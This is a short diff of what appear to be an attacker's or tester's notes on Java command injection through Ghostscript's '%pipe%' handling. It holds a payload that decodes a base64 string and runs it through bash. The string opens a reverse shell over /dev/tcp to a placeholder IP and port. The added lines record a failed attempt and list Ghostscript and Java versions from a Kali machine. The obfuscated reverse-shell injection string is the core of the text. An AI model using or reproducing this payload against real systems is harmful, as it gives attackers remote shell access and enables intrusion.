@@ -8,3 +8,17 @@ YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjEK
 :: pass in argument with string expansion to obtain reverse shell
 
 java RuntimeTest '%pipe%{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC9pcC9wb3J0IDA+JjEK}|{base64,-d}|{bash,-i} -OutputFile=' test "/u01/project/JavaCommandInjection/"
+
+
+:: did not work on 
+
+root@kali:/u02/projects/JavaCommandInjection# /usr/bin/gs -version
+GPL Ghostscript 9.22 (2017-10-04)
+Copyright (C) 2017 Artifex Software, Inc.  All rights reserved.
+
+root@kali:/u02/projects/JavaCommandInjection# java -version
+openjdk version "1.8.0_151"
+OpenJDK Runtime Environment (build 1.8.0_151-8u151-b12-1-b12)
+OpenJDK Server VM (build 25.151-b12, mixed mode)
+
+
